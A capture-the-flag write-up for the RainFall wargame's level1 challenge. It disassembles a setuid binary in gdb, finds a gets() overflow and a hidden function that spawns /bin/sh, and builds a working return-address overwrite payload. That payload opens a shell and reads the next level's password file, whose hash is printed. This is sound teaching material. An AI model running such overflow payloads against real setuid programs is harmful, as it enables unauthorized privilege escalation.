Once we're logged as level1

We are presented with a suid binary.

We try executing it
level1@RainFall:~$ ls
level1
level1@RainFall:~$ ./level1
asdf
level1@RainFall:~$

But it gives us nothing, it seems that it reads from the standard input and do something with it

Let's check it out by disassembling the binary using gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

As it seems that the program has reads the STDIN with gets and put it in a buffer.

After looking mainly enough we found another function called run
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 "/bin/sh"
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.

This function does span a shell using system function call

It's an easy buffer overflow exploit we only have to figure out the offset between the buffer and the ret address in the stack
so we can over-right it the run function address and we are done.

To discover the offset where the ret address start in the stack let's run the program and put 80 A's as input.

(gdb) run
Starting program: /home/user/level1/level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)


As you can see the ret address was modified and the program received a Segmentation fault due to the unknown new value of ret

The offset is 4bytes lower than the actual size we entered (80 - 4) : 76

Now all we need to do is to find the address of the run function then complete our payload.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run                         <------------------- Here's the address of the function

Now let's create our payload.

python -c "print 'A'*76+'\x44\x84\x04\x08'"

With \x44\x84\x04\x08 is the actual run function address but in little indian.

After executing our payload as the input of the our infected program we get the follwing error.
level1@RainFall:~$ python -c "print 'A'*76+'\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$

As it seems that the program uses the pipe as STDIN but after finishing reading the input it closes the pipe and that effects
the interactive shell since it will be reading from the same pipe.

To solve that we include the cat command to hold the pipe from closing.

level1@RainFall:~$ (python -c "print 'A'*76+'\x44\x84\x04\x08'";cat) | ./level1
Good... Wait what?
whoami
level2
cat ../level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

As you see we got a shell and printed the level2 flag.